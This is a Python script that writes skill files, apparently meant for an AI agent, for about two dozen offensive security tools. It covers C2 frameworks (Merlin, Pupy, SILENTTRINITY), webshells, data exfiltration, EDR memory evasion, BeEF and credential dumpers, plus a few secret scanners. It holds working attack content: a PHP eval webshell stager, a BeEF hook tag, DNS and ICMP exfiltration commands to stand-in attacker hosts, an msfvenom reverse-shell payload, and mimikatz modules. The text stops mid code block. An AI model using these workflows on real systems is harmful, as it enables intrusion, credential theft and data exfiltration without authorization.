"""Write all 45 stub SKILL.md files with full content."""
import pathlib

BASE = pathlib.Path(r"D:\Sources\malskill\tools")

SKILLS = {
    # --- api ---
    "api/arjun": {
        "name": "arjun",
        "description": "Discover hidden HTTP parameters in web endpoints. Use when performing API reconnaissance, fuzzing query/body/header parameters, or finding undocumented inputs in REST/GraphQL endpoints.",
        "compatibility": "Python 3; pip install arjun; Linux/macOS/Windows",
        "body": """# Arjun

HTTP parameter discovery — finds hidden GET/POST/JSON/XML parameters in web endpoints.

## Quick Start

```bash
pip install arjun

# Single URL — GET params
arjun -u https://target.com/api/endpoint

# POST body params
arjun -u https://target.com/api/endpoint -m POST

# JSON body
arjun -u https://target.com/api/endpoint -m JSON

# Multiple URLs from file
arjun -i urls.txt -o results.json
```

## Core Flags

| Flag | Purpose |
|------|---------|
| `-u URL` | Target URL |
| `-m GET/POST/JSON/XML` | Request method (default: GET) |
| `-i FILE` | Input file with URLs |
| `-o FILE` | Output results to JSON |
| `-t N` | Threads (default: 5) |
| `-d N` | Request delay (ms) |
| `--headers "K:V"` | Custom headers |
| `--stable` | Avoid flakey endpoints (retry on error) |
| `-q` | Quiet mode |
| `--include` | Always include params in every request |

## Common Workflows

**API recon on authenticated endpoint:**
```bash
arjun -u https://api.target.com/v1/user -m GET --headers "Authorization: Bearer TOKEN"
```

**Fuzz POST form:**
```bash
arjun -u https://target.com/login -m POST
```

**Batch scan from Burp export:**
```bash
cat burp_urls.txt | arjun -i /dev/stdin -o found_params.json
```

## Resources

| File | When to load |
|------|--------------|
| `references/` | Extended wordlist and tamper tips |
""",
    },
    "api/kiterunner": {
        "name": "kiterunner",
        "description": "Context-aware API route discovery and brute-forcing using real-world API schema wordlists. Use when enumerating API endpoints, discovering hidden routes on REST/gRPC services, or replacing dirbusting for API surfaces.",
        "compatibility": "Go binary; Linux/macOS/Windows; github.com/assetnote/kiterunner",
        "body": """# Kiterunner

Context-aware API route brute-forcer using real-world API schema wordlists (Assetnote).

## Quick Start

```bash
# Download binary from https://github.com/assetnote/kiterunner/releases

# Scan with default wordlist
kr scan https://target.com -w routes-small.kite

# Scan from file of hosts
kr scan hosts.txt -w routes-large.kite -x 20

# Replay a finding with full request detail
kr replay -w routes-small.kite "GET   403 [   191,    9,   1] https://target.com/api/v1/user"
```

## Core Flags

| Flag | Purpose |
|------|---------|
| `-w FILE` | Kite wordlist (.kite or .txt) |
| `-x N` | Concurrent requests |
| `--ignore-length N` | Filter by response length |
| `-H "K:V"` | Custom header |
| `-A "bearer:TOKEN"` | Auth header shorthand |
| `--fail-status-codes` | Codes treated as failures |
| `--success-status-codes` | Codes treated as hits |
| `-o json` | JSON output |
| `--delay N` | Per-request delay (ms) |

## Common Workflows

**Authenticated API scan:**
```bash
kr scan https://api.target.com -w routes-large.kite -A "bearer:$TOKEN" -x 30
```

**Filter noise — ignore typical 404/400 lengths:**
```bash
kr scan https://api.target.com -w routes-small.kite --ignore-length 19
```

**Replay to inspect full response:**
```bash
kr replay -w routes-large.kite "POST  200 [  512,  10,   2] https://api.target.com/api/v2/admin"
```

## Resources

| File | When to load |
|------|--------------|
| `references/` | Wordlist sources and API fingerprinting notes |
""",
    },
    # --- c2 ---
    "c2/merlin": {
        "name": "merlin",
        "description": "Cross-platform C2 server using HTTP/2 (h2c), HTTP/3 (QUIC), and DNS transports for covert agent communication. Use when needing a Go-based implant over non-standard encrypted channels to evade network inspection.",
        "compatibility": "Go; Linux/macOS/Windows; github.com/Ne0nd0g/merlin",
        "body": """# Merlin

Cross-platform C2 using HTTP/2 and HTTP/3 (QUIC) — Go server + multi-OS agent.

## Quick Start

```bash
# Download from https://github.com/Ne0nd0g/merlin/releases

# Start server (HTTPS/HTTP2 on 443)
./merlinServer-Linux-x64 -i 0.0.0.0 -p 443 -x509cert server.crt -x509key server.key

# Generate agent
./merlinAgent-Linux-x64 -url https://C2:443/ -psk "passphrase"
```

## Server Commands

| Command | Purpose |
|---------|---------|
| `sessions` | List connected agents |
| `interact <UUID>` | Enter agent session |
| `use module <path>` | Load a module |
| `upload <src> <dst>` | Upload file to agent |
| `download <src>` | Download from agent |
| `shell <cmd>` | Run OS command |
| `exit` | Terminate agent |

## Common Workflows

**HTTP/3 QUIC listener:**
```bash
./merlinServer-Linux-x64 -proto h3 -i 0.0.0.0 -p 8443
./merlinAgent-Windows-x64.exe -url https://C2:8443/ -proto h3 -psk "passphrase"
```

**Mimikatz via Merlin module:**
```
interact <UUID>
use module windows/credentials/mimikatz/logonpasswords
run
```

## Resources

| File | When to load |
|------|--------------|
| `references/` | Transport options and agent build flags |
""",
    },
    "c2/phpsploit": {
        "name": "phpsploit",
        "description": "Stealth post-exploitation framework operating via HTTP headers inside a webshell. Use when you have a PHP webshell on target and need an interactive shell, file ops, and plugin-based post-exploitation over HTTP.",
        "compatibility": "Python 3; pip install phpsploit; Linux/macOS; github.com/nil0x42/phpsploit",
        "body": """# PHPSploit

Stealth PHP webshell framework — full interactive session tunneled in HTTP headers.

## Quick Start

```bash
pip install phpsploit
phpsploit

# Set target and connect
set TARGET http://target.com/shell.php
set PASSKEY MySecret
exploit
```

## Core Commands

| Command | Purpose |
|---------|---------|
| `set TARGET <url>` | Webshell URL |
| `set PASSKEY <key>` | Obfuscation passkey |
| `exploit` | Connect to shell |
| `ls`, `cd`, `cat` | File system ops |
| `upload <local> <remote>` | Upload file |
| `download <remote>` | Download file |
| `run <cmd>` | Execute OS command |
| `load <plugin>` | Load plugin |

## Webshell Setup

Minimal PHP stager (upload to target):
```php
<?php @eval(base64_decode($_SERVER['HTTP_X_PAYLOAD']));
```

## Common Workflows

**Post-exploitation after file upload vuln:**
```
set TARGET http://target.com/uploads/shell.php
exploit
run whoami
```

**Escalate with plugin:**
```
load post/exploit/sudo-bypass
run
```

## Resources

| File | When to load |
|------|--------------|
| `references/` | Webshell variants and plugin list |
""",
    },
    "c2/pupy": {
        "name": "pupy",
        "description": "Cross-platform remote administration and post-exploitation tool with Python implants. Use when needing a lightweight RAT with in-memory modules, multiple transports (TCP/HTTP/WebSocket), and migration capabilities.",
        "compatibility": "Python 2/3; Docker recommended; Linux/macOS; github.com/n1nj4sec/pupy",
        "body": """# Pupy

Cross-platform Python RAT with in-memory module loading and multiple C2 transports.

## Quick Start

```bash
# Docker (recommended)
docker pull n1nj4sec/pupy
docker run -it --rm -p 8443:8443 n1nj4sec/pupy pupysh

# Generate implant
gen -f exe -t obfs3 connect --host C2:8443 -o agent.exe

# Start listener
listen -a obfs3 8443
```

## Core Commands

| Command | Purpose |
|---------|---------|
| `sessions` | List active sessions |
| `interact <id>` | Enter session |
| `run <module>` | Run a post-ex module |
| `gen` | Generate implant |
| `listen` | Start listener |
| `upload/download` | File transfer |

## Common Modules

```bash
run post.gather.credentials   # Dump creds
run post.gather.keylogger     # Start keylogger
run post.gather.screenshot    # Screenshot
run post.pivot.socks5         # SOCKS5 proxy
run post.migrate              # Process migration
```

## Resources

| File | When to load |
|------|--------------|
| `references/` | Transport config and module index |
""",
    },
    "c2/silenttrinity": {
        "name": "silenttrinity",
        "description": "Post-exploitation C2 framework using Boo-lang .NET implants with asynchronous communication. Use when targeting Windows environments needing CLR-based implants that bypass traditional PowerShell-based detections.",
        "compatibility": "Python 3.7+; pip install silenttrinity; Linux/macOS; github.com/byt3bl33d3r/SILENTTRINITY",
        "body": """# SILENTTRINITY (ST)

Asynchronous Python C2 with .NET (Boo) implants — evades PS-based detection.

## Quick Start

```bash
pip install silenttrinity

# Start teamserver
st teamserver 0.0.0.0 password

# Connect client
st client wss://127.0.0.1:5000 password

# Create listener
listeners new http
listeners start http

# Generate stager
stagers list
stagers generate msbuild http
```

## Core Commands

| Command | Purpose |
|---------|---------|
| `sessions` | Active implants |
| `sessions interact <id>` | Enter session |
| `modules list` | Available post-ex modules |
| `modules use <name>` | Load module |
| `run` | Execute loaded module against session |
| `listeners` | Manage C2 listeners |
| `stagers` | Generate implants |

## Common Workflows

**Credential dumping:**
```
modules use boo/credentials/mimikatz
run
```

**Lateral movement via WMI:**
```
modules use boo/lateral/invoke-wmi
set Target 192.168.1.50
run
```

## Resources

| File | When to load |
|------|--------------|
| `references/` | Stager formats and module list |
""",
    },
    # --- cloud ---
    "cloud/gitleaks": {
        "name": "gitleaks",
        "description": "Detect hardcoded secrets (API keys, tokens, credentials) in git repos and files. Use when auditing source code, CI pipelines, or commit history for leaked secrets in red-team or pre-engagement recon.",
        "compatibility": "Go binary; Linux/macOS/Windows; github.com/gitleaks/gitleaks",
        "body": """# Gitleaks

Detect hardcoded secrets in git repos, files, and CI pipelines.

## Quick Start

```bash
# Scan current git repo
gitleaks detect --source . -v

# Scan a remote repo
gitleaks detect --source https://github.com/org/repo

# Scan specific path (non-git)
gitleaks detect --source /path/to/dir --no-git

# Generate report
gitleaks detect --source . -r report.json -f json
```

## Core Flags

| Flag | Purpose |
|------|---------|
| `detect` | Scan for secrets |
| `protect` | Pre-commit hook mode |
| `--source PATH` | Target path or URL |
| `--no-git` | Scan filesystem (not git history) |
| `-r FILE` | Report output file |
| `-f FORMAT` | Output format (json/csv/sarif) |
| `-v` | Verbose |
| `--config FILE` | Custom rules config |
| `--branch NAME` | Scan specific branch |
| `--log-opts` | Git log options (e.g. `--all`) |

## Common Workflows

**Full history scan:**
```bash
gitleaks detect --source . --log-opts="--all" -r leaks.json -f json
```

**CI pipeline integration (fail on leak):**
```bash
gitleaks detect --source . --exit-code 1
```

**Custom rule for internal tokens:**
```toml
# .gitleaks.toml
[[rules]]
id = "internal-api-key"
regex = '''MYAPP_[A-Z0-9]{32}'''
```

## Resources

| File | When to load |
|------|--------------|
| `references/` | Custom rule examples and CI config |
""",
    },
    "cloud/pacu": {
        "name": "pacu",
        "description": "AWS exploitation framework for auditing and attacking misconfigured AWS environments. Use when performing AWS red-team engagements, privilege escalation, data exfiltration, or persistence in AWS accounts.",
        "compatibility": "Python 3.6+; pip install pacu; Linux/macOS/Windows; github.com/RhinoSecurityLabs/pacu",
        "body": """# Pacu

AWS exploitation framework — enumerate, escalate, pivot, and persist in AWS.

## Quick Start

```bash
pip install pacu
pacu

# Configure AWS creds (or use existing ~/.aws/credentials)
set_keys
# Enter access key, secret key, session token

# List modules
ls
# Run a module
run iam__enum_permissions
```

## Key Modules

| Module | Purpose |
|--------|---------|
| `iam__enum_permissions` | Enumerate IAM permissions |
| `iam__privesc_scan` | Find privilege escalation paths |
| `iam__backdoor_users_passwords` | Add backdoor IAM passwords |
| `ec2__enum` | Enumerate EC2 instances |
| `s3__download_bucket` | Download S3 bucket contents |
| `lambda__enum` | Enumerate Lambda functions |
| `cognito__attack` | Attack Cognito user pools |
| `cloudtrail__download_event_history` | Download CloudTrail logs |

## Common Workflows

**Initial enumeration:**
```
run iam__enum_permissions
run ec2__enum
run s3__enum
```

**Privilege escalation:**
```
run iam__privesc_scan
# Follow recommendations from output
```

**Data exfil:**
```
run s3__download_bucket --bucket target-bucket
```

## Resources

| File | When to load |
|------|--------------|
| `references/` | AWS privesc techniques and module args |
""",
    },
    "cloud/scoutsuite": {
        "name": "scoutsuite",
        "description": "Multi-cloud security auditing tool for AWS, Azure, GCP, and others. Use when assessing cloud misconfigurations, reviewing IAM policies, security groups, storage permissions, and generating audit reports.",
        "compatibility": "Python 3; pip install scoutsuite; Linux/macOS/Windows; github.com/nccgroup/ScoutSuite",
        "body": """# ScoutSuite

Multi-cloud security auditor — AWS, Azure, GCP, OCI, Alibaba Cloud.

## Quick Start

```bash
pip install scoutsuite

# AWS (uses default ~/.aws/credentials profile)
scout aws

# Azure
scout azure --cli

# GCP
scout gcp --project PROJECT_ID

# Output in specific dir
scout aws -r ./report-dir
```

## Common Flags

| Flag | Purpose |
|------|---------|
| `aws/azure/gcp/oci` | Cloud provider |
| `--profile NAME` | AWS named profile |
| `--regions us-east-1` | Limit to regions |
| `--services s3,iam` | Limit to services |
| `--skip-services ec2` | Skip services |
| `-r DIR` | Output directory |
| `--no-browser` | Don't open HTML report |
| `--max-workers N` | Parallelism |

## Common Workflows

**Full AWS audit:**
```bash
scout aws --profile pentest-account -r ./aws-report
```

**Azure with MFA:**
```bash
az login
scout azure --cli -r ./azure-report
```

**Open HTML report:**
```bash
# Report auto-opens; or manually:
start ./aws-report/scoutsuite-report/index.html
```

## Resources

| File | When to load |
|------|--------------|
| `references/` | Finding categories and remediation guidance |
""",
    },
    "cloud/trufflehog": {
        "name": "trufflehog",
        "description": "Find leaked credentials and secrets in git repos, S3 buckets, filesystems, and CI systems using entropy analysis and 700+ detectors. Use when hunting for secrets in large codebases or cloud storage during recon.",
        "compatibility": "Go binary or Docker; Linux/macOS/Windows; github.com/trufflesecurity/trufflehog",
        "body": """# TruffleHog

Secret scanner with 700+ detectors — git history, S3, GCS, filesystem, and CI systems.

## Quick Start

```bash
# Docker
docker run --rm trufflesecurity/trufflehog:latest git https://github.com/org/repo

# Binary
trufflehog git https://github.com/org/repo --only-verified

# Local repo
trufflehog git file:///path/to/repo --only-verified

# S3 bucket
trufflehog s3 --bucket=target-bucket
```

## Core Flags

| Flag | Purpose |
|------|---------|
| `git <url>` | Scan git repo |
| `s3` | Scan S3 bucket |
| `filesystem` | Scan local files |
| `--only-verified` | Show only verified secrets |
| `--since-commit SHA` | Scan from commit |
| `--branch NAME` | Scan specific branch |
| `--json` | JSON output |
| `--concurrency N` | Thread count |
| `--include-detectors` | Limit detector types |

## Common Workflows

**Verified secrets only (CI-safe):**
```bash
trufflehog git https://github.com/org/repo --only-verified --json > secrets.json
```

**Full history of internal monorepo:**
```bash
trufflehog git file:///repos/monorepo --json --concurrency 8
```

**S3 audit:**
```bash
trufflehog s3 --bucket internal-assets --only-verified
```

## Resources

| File | When to load |
|------|--------------|
| `references/` | Detector list and custom detector config |
""",
    },
    # --- cracking ---
    "cracking/cain-and-abel": {
        "name": "cain-and-abel",
        "description": "Windows password recovery tool for sniffing, cracking (dictionary/brute-force/cryptanalysis), and decoding stored credentials. Use when recovering Windows hashes, cracking captured handshakes, or decoding cached credentials on Windows systems.",
        "compatibility": "Windows only; GUI application; legacy tool (last updated 2014)",
        "body": """# Cain & Abel

Windows GUI password recovery — sniffer, hash cracker, credential decoder.

## Quick Start

1. Download from oxid.it (legacy) or archive
2. Run as Administrator
3. Select **Cracker** tab → Add hashes
4. Right-click hash → **Dictionary Attack** / **Brute-Force Attack** / **Rainbow Table**

## Core Features

| Feature | Purpose |
|---------|---------|
| Sniffer | Capture network credentials (ARP poisoning) |
| Cracker | Dictionary, brute-force, cryptanalysis of hashes |
| Decoders | Decode stored passwords (LSA, VNC, dialup) |
| Network | ARP poisoning, route discovery |
| Wireless | WEP/WPA capture and crack |
| Certificate | Certificate collector via MITM |

## Hash Types Supported

MD5, SHA-1, LM, NTLM, NTLMv2, MySQL, MS-SQL, Oracle, Cisco PIX/IOS, VNC, RADIUS, WPA.

## Common Workflows

**Crack NTLM from SAM dump:**
1. Cracker tab → `+` → Add NT hashes from SAM
2. Right-click → Dictionary Attack → point to wordlist

**ARP poison + credential capture:**
1. Sniffer tab → Enable sniffer
2. ARP tab → Add victim + gateway
3. Passwords tab → view captured creds

> **Note**: Use only on authorized systems. Cain & Abel triggers most AV.

## Resources

| File | When to load |
|------|--------------|
| `references/` | Hash import formats and dictionary sources |
""",
    },
    "cracking/john": {
        "name": "john",
        "description": "CPU-based password cracker supporting hundreds of hash formats with wordlist, rules, and incremental modes. Use when cracking hashes offline with CPU resources, applying mangling rules, or when GPUs are unavailable.",
        "compatibility": "Linux/macOS/Windows; apt install john or build from source (Openwall)",
        "body": """# John the Ripper

CPU password cracker — hundreds of hash formats, wordlist + rules + incremental.

## Quick Start

```bash
# Auto-detect format and crack
john hashes.txt --wordlist=/usr/share/wordlists/rockyou.txt

# Show cracked passwords
john hashes.txt --show

# Single crack mode (fast, username-based)
john hashes.txt --single

# Incremental (brute-force)
john hashes.txt --incremental
```

## Core Flags

| Flag | Purpose |
|------|---------|
| `--wordlist=FILE` | Dictionary attack |
| `--rules[=RULE]` | Apply mangling rules |
| `--format=TYPE` | Force hash format |
| `--single` | Single crack (username hints) |
| `--incremental` | Brute-force |
| `--show` | Display cracked passwords |
| `--pot=FILE` | Custom pot file |
| `--fork=N` | Parallel processes |
| `--list=formats` | List all formats |

## Common Workflows

**NTLM with rules:**
```bash
john ntlm.txt --format=NT --wordlist=rockyou.txt --rules=best64
```

**SSH private key:**
```bash
ssh2john id_rsa > id_rsa.hash
john id_rsa.hash --wordlist=rockyou.txt
```

**Zip archive:**
```bash
zip2john archive.zip > zip.hash
john zip.hash --wordlist=rockyou.txt
```

## Resources

| File | When to load |
|------|--------------|
| `references/` | Rule syntax and format list |
""",
    },
    # --- data-exfiltration ---
    "data-exfiltration/cloakify": {
        "name": "cloakify",
        "description": "Exfiltrate data by encoding it as innocuous-looking strings (tweets, chess moves, cat names). Use when needing to bypass DLP tools by disguising exfiltrated data as benign traffic or files.",
        "compatibility": "Python 2/3; Linux/macOS; github.com/TryCatchHCF/Cloakify",
        "body": """# Cloakify

Data exfiltration via steganographic encoding — disguise payloads as benign content.

## Quick Start

```bash
git clone https://github.com/TryCatchHCF/Cloakify
cd Cloakify

# Encode file into disguised output
python cloakify.py payload.zip ciphers/desserts.ciph > exfil.txt

# Decode on attacker side
python decloakify.py exfil.txt ciphers/desserts.ciph > payload.zip
```

## Core Usage

| Command | Purpose |
|---------|---------|
| `cloakify.py <file> <cipher>` | Encode payload with cipher |
| `decloakify.py <file> <cipher>` | Decode back to original |
| `listCiphers.py` | Show available ciphers |
| `addNoise.py` | Add noise lines to output |
| `removeNoise.py` | Strip noise before decoding |

## Available Ciphers (examples)

`desserts` · `movies1984` · `chessOpenings` · `twitterFavoriteEmoji` · `ATampTAreaCodes` · `geo_lattitude`

## Common Workflows

**Exfil over DNS (combine with dnscat):**
```bash
# 1. Encode
python cloakify.py secrets.txt ciphers/desserts.ciph > encoded.txt
# 2. Paste each line as DNS query hostname
# 3. Decode on C2
python decloakify.py captured.txt ciphers/desserts.ciph
```

**Add noise to evade pattern matching:**
```bash
python cloakify.py payload.zip ciphers/movies1984.ciph | python addNoise.py 10 > noisy.txt
python removeNoise.py noisy.txt 10 | python decloakify.py /dev/stdin ciphers/movies1984.ciph
```

## Resources

| File | When to load |
|------|--------------|
| `references/` | Cipher creation guide |
""",
    },
    "data-exfiltration/dnsexfiltrator": {
        "name": "dnsexfiltrator",
        "description": "Exfiltrate data over DNS queries using a custom DNS server. Use when HTTP/S channels are blocked and DNS traffic is allowed outbound, enabling covert file transfer via DNS TXT/A records.",
        "compatibility": "Python 3 (server); PowerShell (client); Linux server + Windows target; github.com/Arno0x/DNSExfiltrator",
        "body": """# DNSExfiltrator

Covert file exfiltration via DNS — Python server receives, PowerShell client sends.

## Quick Start

```bash
# Attacker side — start DNS server (needs port 53 UDP)
sudo python3 dnsexfiltrator.py -d exfil.attacker.com -p password

# Victim side (PowerShell)
Invoke-DNSExfiltrator -i C:\\sensitive\\file.zip -d exfil.attacker.com -p password -t 500
```

## DNS Setup

Point an NS record for your subdomain to your listener IP:
```
exfil.attacker.com    NS    ns1.attacker.com
ns1.attacker.com      A     <your-server-ip>
```

## Core Options

| Option | Purpose |
|--------|---------|
| `-d DOMAIN` | Exfil domain (server) |
| `-p PASSWORD` | Encryption passphrase |
| `-b 64/32` | Encoding (base64/base32) |
| `-t MS` | Throttle between queries (ms) |
| `-r N` | Max retries |

## Common Workflows

**Exfil archive from Windows:**
```powershell
# Compress first
Compress-Archive -Path C:\\Users\\victim\\Documents -DestinationPath docs.zip
# Exfil
Invoke-DNSExfiltrator -i docs.zip -d exfil.attacker.com -p MyPass123 -t 200
```

## Resources

| File | When to load |
|------|--------------|
| `references/` | DNS setup guide and throttle tuning |
""",
    },
    "data-exfiltration/pyexfil": {
        "name": "pyexfil",
        "description": "Multi-channel data exfiltration tool supporting 20+ covert channels (ICMP, DNS, HTTPS, SMTP, Slack, QUIC). Use when testing DLP controls or exfiltrating data through unconventional protocols.",
        "compatibility": "Python 3; pip install pyexfil; Linux/macOS; github.com/ytisf/PyExfil",
        "body": """# PyExfil

Multi-channel exfiltration — 20+ covert channels for DLP testing and red-team ops.

## Quick Start

```bash
pip install pyexfil

# ICMP exfil — sender (victim)
python -c "from pyexfil.network.ICMP.icmp_exfil import Send; Send('192.168.1.100', open('file.zip','rb').read())"

# ICMP receiver (attacker)
python -c "from pyexfil.network.ICMP.icmp_exfil import Receive; Receive('0.0.0.0', 'out.zip')"
```

## Exfil Channels

| Channel | Module path |
|---------|-------------|
| ICMP | `network.ICMP` |
| DNS | `network.DNS` |
| HTTPS POST | `network.HTTPS` |
| SMTP | `network.SMTP_email` |
| Slack | `application.Slack` |
| FTP STOR | `network.FTP` |
| NTP | `network.NTP` |
| BGP | `network.BGP` |
| QUIC | `network.QUIC` |
| audio (microphone) | `physical.audio` |

## Common Workflows

**DNS exfil:**
```python
from pyexfil.network.DNS.dns_exfil import Send
Send(nameserver='attacker.com', data=open('secrets.txt','rb').read())
```

**Test all channels systematically:**
```bash
# Use individual module scripts in pyexfil/network/
python pyexfil/network/ICMP/icmp_exfil.py --help
```

## Resources

| File | When to load |
|------|--------------|
| `references/` | Channel setup and detection evasion notes |
""",
    },
    # --- evasion ---
    "evasion/nim-shellcode-fluctuation": {
        "name": "nim-shellcode-fluctuation",
        "description": "Nim port of shellcode fluctuation — encrypts injected shellcode in memory between executions to evade memory scanners. Use when deploying implants that must hide from EDR in-memory scanning of RWX regions.",
        "compatibility": "Nim; Windows x64; MSVC or MinGW; github.com/tijme/nim-mangle",
        "body": """# Nim Shellcode Fluctuation

Memory evasion — encrypts shellcode (XOR/RC4) in RX pages between C2 callbacks.

## Quick Start

```bash
# Install Nim
# nimble install winim

# Build
nim c -d:release -d:strip --opt:size -o:agent.exe fluctuation.nim

# Inject shellcode (embed in source)
# Replace SHELLCODE placeholder in nim source with msfvenom/Cobalt output
```

## How It Works

1. Shellcode is injected into RX memory
2. Before sleeping: encrypt in-place (XOR/RC4), change page to RW
3. After sleep: decrypt, change page back to RX/RWX
4. EDR memory scans during sleep see only garbage

## Core Configuration

```nim
const SLEEP_MS = 5000       # Sleep between beacons
const XOR_KEY  = 0x41       # Encryption key byte
const FLUCTUATE = true      # Enable/disable fluctuation
```

## Common Workflows

**Generate shellcode and embed:**
```bash
msfvenom -p windows/x64/meterpreter/reverse_https LHOST=C2 LPORT=443 -f raw -o shell.bin
# Base64-encode and embed in nim source
python3 -c "import base64; print(base64.b64encode(open('shell.bin','rb').read()).decode())"
```

**Combine with process injection:**
```nim
# Use createRemoteThread or QueueUserAPC for injection
# then enable fluctuation in the injected thread
```

## Resources

| File | When to load |
|------|--------------|
| `references/` | APC injection variants and EDR bypass notes |
""",
    },
    "evasion/shellcode-fluctuation": {
        "name": "shellcode-fluctuation",
        "description": "C++ shellcode fluctuation technique that encrypts injected shellcode between C2 sleep intervals to evade EDR memory scans. Use when implants are being detected by memory-scanning EDR products during sleep.",
        "compatibility": "C++; Windows x64; MSVC or MinGW; github.com/mgeeky/ShellcodeFluctuation",
        "body": """# Shellcode Fluctuation

C++ in-memory evasion — XOR-encrypts shellcode in RX pages during C2 sleep to defeat memory scanners.

## Quick Start

```bash
# Clone and build with MSVC
git clone https://github.com/mgeeky/ShellcodeFluctuation
# Open in Visual Studio, build Release x64

# Or MinGW
x86_64-w64-mingw32-g++ -O2 -o fluctuator.exe main.cpp -lntdll
```

## Core Mechanism

```
[Shellcode in memory]
  Awake:  → Decrypt → Execute → Sleep
  Asleep: → Encrypt (XOR) → change PROT to RW → Scanner sees garbage
  Wake:   → change PROT to RX → Decrypt → Resume
```

## Configuration (main.cpp)

```cpp
#define SHELLCODE_FLUCTUATE   true
#define XOR_KEY               0xdeadbeef
#define SLEEP_INTERVAL_MS     5000
```

## Common Workflows

**Integrate into Cobalt Strike BOF loader:**
1. Generate raw shellcode from CS listener
2. Embed in fluctuator loader source
3. Call `FluctuateShellcode()` wrapper before Sleep()

**Combine with indirect syscalls:**
```cpp
// Replace VirtualProtect with direct NtProtectVirtualMemory
// via syscall stub to avoid API hooks
```

## Resources

| File | When to load |
|------|--------------|
| `references/` | Hook evasion and memory protection patterns |
""",
    },
    # --- exploits ---
    "exploits/beef": {
        "name": "beef",
        "description": "Browser Exploitation Framework — hook browsers via XSS/injected JS and perform client-side attacks. Use when you have XSS on a target to pivot into browser-side attacks, session hijacking, and social engineering.",
        "compatibility": "Ruby; Linux/macOS; apt install beef-xss or github.com/beefproject/beef",
        "body": """# BeEF (Browser Exploitation Framework)

Hook browsers via XSS and execute client-side attacks from a web console.

## Quick Start

```bash
# Kali
beef-xss

# Or from source
git clone https://github.com/beefproject/beef
cd beef && ./install && ./beef

# Panel: http://127.0.0.1:3000/ui/panel
# Default creds: beef/beef
# Hook URL: http://YOUR_IP:3000/hook.js
```

## Inject Hook

```html
<!-- Inject in XSS payload or MITM response -->
<script src="http://YOUR_IP:3000/hook.js"></script>
```

## Key Module Categories

| Category | Examples |
|----------|---------|
| Network | Port scanner, ping sweep, SSRF |
| Browser | Fingerprint, clipboard steal, camera access |
| Social Engineering | Fake login, fake update, clickjacking |
| Exploits | Browser CVEs, Java exploits |
| Persistence | Persistent hook via service worker |
| Misc | Keylogger, screenshot, geolocation |

## Common Workflows

**Steal cookies via hooked browser:**
```
Modules > Browser > Hooked Domain > Get Cookie
```

**Phishing via fake login overlay:**
```
Modules > Social Engineering > Pretty Theft
```

**Port scan internal network from browser:**
```
Modules > Network > Port Scanner
# Set targets: 192.168.1.1-254
```

## Resources

| File | When to load |
|------|--------------|
| `references/` | Module list and hook persistence techniques |
""",
    },
    "exploits/searchsploit": {
        "name": "searchsploit",
        "description": "Offline CLI search tool for Exploit-DB. Use when finding public exploits for discovered CVEs and software versions during vulnerability research or pre-exploitation.",
        "compatibility": "Bash; Linux/macOS; part of exploitdb package; apt install exploitdb",
        "body": """# SearchSploit

Offline Exploit-DB search — find public exploits by software name, version, or CVE.

## Quick Start

```bash
# Install
apt install exploitdb

# Search by product
searchsploit apache 2.4

# Search by CVE
searchsploit CVE-2021-41773

# Exact phrase
searchsploit -e "remote code execution"

# Copy exploit to current dir
searchsploit -m 50383
```

## Core Flags

| Flag | Purpose |
|------|---------|
| `-t TERM` | Search title only |
| `-e TERM` | Exact match |
| `-m ID` | Mirror/copy exploit file |
| `-p ID` | Show full path |
| `-x ID` | Examine exploit in pager |
| `--cve CVE` | Search by CVE |
| `-w` | Show web URL (exploitdb.com) |
| `--nmap FILE` | Parse Nmap XML and find exploits |
| `-u` | Update local database |
| `--id` | Show EDB-ID |

## Common Workflows

**Find exploits from Nmap scan:**
```bash
nmap -sV target.com -oX scan.xml
searchsploit --nmap scan.xml
```

**Examine and copy relevant exploit:**
```bash
searchsploit -x 50383     # Read it
searchsploit -m 50383     # Copy to ./
```

**Update local DB:**
```bash
searchsploit -u
```

## Resources

| File | When to load |
|------|--------------|
| `references/` | Exploit modification and compilation notes |
""",
    },
    # --- linux ---
    "linux/linux-exploit-suggester": {
        "name": "linux-exploit-suggester",
        "description": "Suggest Linux privilege escalation exploits based on kernel version and OS. Use after gaining initial access to Linux systems to quickly identify applicable local privilege escalation CVEs.",
        "compatibility": "Bash/Perl; Linux; github.com/The-Z-Labs/linux-exploit-suggester",
        "body": """# Linux Exploit Suggester

Kernel exploit suggester — maps running Linux version to known privesc CVEs.

## Quick Start

```bash
# Download and run on target
curl -sL https://raw.githubusercontent.com/The-Z-Labs/linux-exploit-suggester/master/linux-exploit-suggester.sh | bash

# Or run locally
bash linux-exploit-suggester.sh

# Specify kernel manually
bash linux-exploit-suggester.sh --kernel 5.4.0
```

## Core Flags

| Flag | Purpose |
|------|---------|
| `--kernel VERSION` | Override detected kernel |
| `--uname STRING` | Pass uname -r output |
| `-f` | More verbose (show all details) |
| `--checksec` | Check mitigations (NX/SMEP/etc) |
| `-g` | Show only highly probable exploits |
| `--cvelist` | Output CVE list |

## Notable Exploits Detected

`DirtyCow (CVE-2016-5195)` · `Dirty Pipe (CVE-2022-0847)` · `OverlayFS (CVE-2023-0386)` · `SUID sudo` · `nmap --interactive` · `pkexec (CVE-2021-4034)`

## Common Workflows

**Full check with mitigation audit:**
```bash
bash linux-exploit-suggester.sh --checksec -f
```

**Parse output to get CVEs:**
```bash
bash linux-exploit-suggester.sh --cvelist 2>/dev/null
```

**Transfer to target:**
```bash
# Attacker
python3 -m http.server 8080
# Target
wget http://ATTACKER:8080/linux-exploit-suggester.sh -O /tmp/les.sh && bash /tmp/les.sh
```

## Resources

| File | When to load |
|------|--------------|
| `references/` | Exploit compilation and kernel exploit notes |
""",
    },
    "linux/mimipenguin": {
        "name": "mimipenguin",
        "description": "Dump credentials from memory on Linux systems (GNOME Keyring, VSFTPd, Apache, SSH). Use when you have root on a Linux target to extract plaintext passwords from running processes and memory.",
        "compatibility": "Python 3 / Bash; Linux; requires root; github.com/huntergregal/mimipenguin",
        "body": """# MimiPenguin

Linux credential dumper — extract plaintext passwords from memory (Mimikatz-equivalent for Linux).

## Quick Start

```bash
# Requires root
git clone https://github.com/huntergregal/mimipenguin
cd mimipenguin

# Python version
sudo python3 mimipenguin.py

# Shell version
sudo bash mimipenguin.sh
```

## Sources Dumped

| Source | Notes |
|--------|-------|
| GNOME Keyring | `/proc/<PID>/mem` of gnome-keyring-daemon |
| VSFTPd | Active FTP session credentials |
| Apache Basic Auth | HTTP Basic Auth from apache2 process |
| SSH | SSH passphrase from ssh-agent |
| gdm3 | GNOME Display Manager login |
| su | Credentials from `su` process |

## Common Workflows

**Quick dump all sources:**
```bash
sudo python3 mimipenguin.py 2>/dev/null
```

**Shell version (no python dependency):**
```bash
